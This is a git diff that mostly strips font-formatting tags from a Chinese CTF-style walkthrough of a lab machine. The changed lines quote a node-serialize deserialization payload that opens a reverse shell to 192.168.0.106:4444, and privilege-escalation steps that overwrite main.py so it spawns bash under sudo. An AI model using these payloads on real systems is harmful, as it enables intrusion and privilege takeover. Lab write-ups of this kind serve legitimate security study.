@@ -10,7 +10,7 @@ tags:
   - Linux Machine
 ---
 
-![](https://cdn.nlark.com/yuque/0/2026/png/40628873/1768216673386-bd88747c-5558-497c-bd03-4c5b7e6be620.png)
+![](/image/hmvmachines/Deba-1.png)
 
 # 信息收集
 ## IP定位
@@ -324,7 +324,7 @@ console.log(`
 startListener(config.shellPort);
 ```
 
-> <font style="color:rgb(0, 0, 0);">{"username":"_$$ND_FUNC$$_function(){\n var net = require('net');\n var cp = require('child_process');\n var sh = cp.spawn('/bin/sh', []);\n var client = new net.Socket();\n client.connect(4444, '192.168.0.106', function() {\n client.pipe(sh.stdin);\n sh.stdout.pipe(client);\n sh.stderr.pipe(client);\n });\n }()"}</font>
+> {"username":"_$$ND_FUNC$$_function(){\n var net = require('net');\n var cp = require('child_process');\n var sh = cp.spawn('/bin/sh', []);\n var client = new net.Socket();\n client.connect(4444, '192.168.0.106', function() {\n client.pipe(sh.stdin);\n sh.stdout.pipe(client);\n sh.stderr.pipe(client);\n });\n }()"}
 >
 
 ```plain
@@ -397,7 +397,7 @@ print("\n")
 
 
 
-### **<font style="color:rgb(6, 10, 38);">用 </font>**`<font style="color:rgb(6, 10, 38);">cat ></font>`**<font style="color:rgb(6, 10, 38);"> 覆盖 </font>**`<font style="color:rgb(6, 10, 38);">main.py</font>`**<font style="color:rgb(6, 10, 38);"> 内容</font>**
+### **用 **`cat >`** 覆盖 **`main.py`** 内容**
 ```plain
 www-data@debian:/home/low$ 
 cat > /home/low/scripts/main.py << 'EOF'
@@ -406,21 +406,21 @@ os.system('bash')
 EOF
 ```
 
-+ <font style="color:rgb(6, 10, 38);">使用 shell 的重定向</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">></font>`<font style="color:rgb(6, 10, 38);"> </font>**<font style="color:rgb(6, 10, 38);">直接覆盖</font>**<font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">main.py</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">的内容。</font>
-+ <font style="color:rgb(6, 10, 38);">新内容是一个恶意 Python 脚本：</font>
-    - <font style="color:rgb(6, 10, 38);">打印提示</font>
-    - <font style="color:rgb(6, 10, 38);">执行</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">id</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">和</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">whoami</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">查看当前身份</font>
-    - <font style="color:rgb(6, 10, 38);">启动一个</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">bash</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">shell（获得交互式控制）</font>
++ 使用 shell 的重定向 `>` **直接覆盖** `main.py` 的内容。
++ 新内容是一个恶意 Python 脚本：
+    - 打印提示
+    - 执行 `id` 和 `whoami` 查看当前身份
+    - 启动一个 `bash` shell（获得交互式控制）
 
-<font style="color:rgba(6, 10, 38, 0.7) !important;">✅</font><font style="color:rgba(6, 10, 38, 0.7) !important;"> 成功注入恶意代码到 </font>`<font style="color:rgb(6, 10, 38);">main.py</font>`<font style="color:rgba(6, 10, 38, 0.7) !important;">。</font>
+✅ 成功注入恶意代码到 `main.py`。
 
-### **<font style="color:rgb(6, 10, 38);">触发目标脚本执行（以 </font>**`<font style="color:rgb(6, 10, 38);">low</font>`**<font style="color:rgb(6, 10, 38);"> 身份）</font>**
+### **触发目标脚本执行（以 **`low`** 身份）**
 ```plain
 www-data@debian:/home/low$ sudo -u low /usr/bin/python3 /home/low/scripts/script.py
 ```
 
-+ <font style="color:rgb(6, 10, 38);">系统以</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">low</font>`<font style="color:rgb(6, 10, 38);"> </font><font style="color:rgb(6, 10, 38);">用户身份运行</font><font style="color:rgb(6, 10, 38);"> </font>`<font style="color:rgb(6, 10, 38);">script.py</font>`
-+ <font style="color:rgb(6, 10, 38);">假设 </font>`<font style="color:rgb(6, 10, 38);">script.py</font>`<font style="color:rgb(6, 10, 38);"> 内容类似：</font>
++ 系统以 `low` 用户身份运行 `script.py`
++ 假设 `script.py` 内容类似：
 
 ```plain
 # script.py
@@ -428,7 +428,7 @@ import main  # 从当前目录导入 main.py
 main.run()
 ```
 
-+ <font style="color:rgb(6, 10, 38);">由于 Python 默认优先从</font>**<font style="color:rgb(6, 10, 38);">当前工作目录</font>**<font style="color:rgb(6, 10, 38);">导入模块，因此会加载被篡改的 </font>`<font style="color:rgb(6, 10, 38);">main.py</font>`
++ 由于 Python 默认优先从**当前工作目录**导入模块，因此会加载被篡改的 `main.py`
 
 ## 计时任务提权-debain
 ```plain
